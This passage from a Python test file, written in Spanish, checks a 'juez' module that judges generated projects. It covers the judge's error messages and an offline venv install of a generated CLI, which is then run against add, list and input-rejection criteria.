    (d / "pyproject.toml").write_text('[project]\nname = "demo"\n[project.scripts]\ndemo = "demo.cli:main"\n',
                                      encoding="utf-8")
    p = juez.paso(d, "cli")
    assert p["exit"] == 1 and "falta compilar o instalar" in p["tail"] and ".venv/" in p["tail"]
    assert "no se sabe qué programa" in juez.paso(d, "rust")["tail"]
    assert "no lo es" in juez.paso(d, "static")["tail"]
    (d / juez.ARCHIVO).write_text(json.dumps(CRITERIOS), encoding="utf-8")
    assert "destino de consola" in juez.paso(d, "cli")["tail"]


def test_cli_generado_real_pasa_el_juez_de_consola(tmp_path):
    """El comando que genera ``create --target cli``, instalado sin red en un entorno virtual, pasa unos criterios
    de consola de añadir, listar y borrar."""
    import re
    import sys

    from eolfi.core.evidence import EvidenceStore
    from eolfi.flows.create_flow import create_project
    from tests.fixtures import build_site

    out = tmp_path / "cli"
    create_project([str(build_site(tmp_path / "site"))], EvidenceStore(":memory:"), out, name="Notas",
                   target="cli", do_verify=False)
    venv = out / ".venv"
    subprocess.run([sys.executable, "-m", "venv", "--system-site-packages", str(venv)], check=True)
    py = venv / ("Scripts/python.exe" if sys.platform == "win32" else "bin/python")
    r = subprocess.run([str(py), "-m", "pip", "install", "-q", "--no-index", "--no-build-isolation", "--no-deps",
                        "-e", str(out)], capture_output=True, text=True, check=False)
    if r.returncode != 0:
        pytest.skip("no se pudo instalar el comando sin red: " + r.stderr[-300:])
    exe = juez.ejecutable(out, "cli")
    assert exe.is_file()
    ayuda = subprocess.run([str(exe), "--help"], capture_output=True, text=True, check=True).stdout
    recurso = next(r for r in re.findall(r"^\s{4}([a-z_]+)\s", ayuda, re.M) if r != "info")
    (out / juez.ARCHIVO).write_text(json.dumps({"version": 1, "consola": True, "pasos": [
        {"ejecutar": ["--json", "info"]}, {"comprobar": "info responde", "codigo": 0},
        {"ejecutar": [recurso, "add", "comprar pan"]}, {"comprobar": "añade", "codigo": 0},
        {"ejecutar": ["--json", recurso, "list"]}, {"comprobar": "lista lo añadido", "contiene": "comprar pan"},
        {"comprobar": "sin trazas", "no_contiene": "Traceback"},
        {"ejecutar": [recurso, "add", "x" * 201]}, {"comprobar": "rechaza un nombre vacío", "codigo": 2}]}),
        encoding="utf-8")
    p = juez.paso(out, "cli")
    assert (p["exit"], p["step"]) == (0, "juez funcional (5/5)"), p["tail"]
